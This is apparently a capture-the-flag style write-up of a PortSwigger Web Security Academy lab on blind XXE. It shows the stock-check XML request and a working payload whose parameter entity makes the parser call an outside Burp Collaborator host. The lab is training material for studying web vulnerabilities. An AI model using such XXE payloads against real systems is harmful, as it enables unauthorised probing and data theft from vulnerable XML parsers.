
# Blind XXE with out-of-band interaction via XML parameter entities

This lab has a "Check stock" feature that parses XML input, but does not display any unexpected values, and blocks requests containing regular external entities.

To solve the lab, use a parameter entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.

Note: To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.

---------------------------------------------

Reference: https://portswigger.net/web-security/xxe/blind

---------------------------------------------

Generated link: https://0a8300cf04a26be4802b0864005700e8.web-security-academy.net/

Original request:

```
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
	<productId>
		1
	</productId>
	<storeId>
		1
	</storeId>
</stockCheck>
```

We want to add something like this example from the reference:

``` 
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://COLLABORATOR_URL"> %xxe; ]>
```

We will test the following payload:

```
<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://q6x580qbz3i8x9wutkq9i4bg97fy3ord.oastify.com"> %xxe; ]>		
	<stockCheck>
		<productId>
			1
		</productId>
		<storeId>
			1
		</storeId>
	</stockCheck>
```



![img](images/Blind%20XXE%20with%20out-of-band%20interaction%20via%20XML%20parameter%20entities/1.png)


We get requests in Burp Collaborator:



![img](images/Blind%20XXE%20with%20out-of-band%20interaction%20via%20XML%20parameter%20entities/2.png)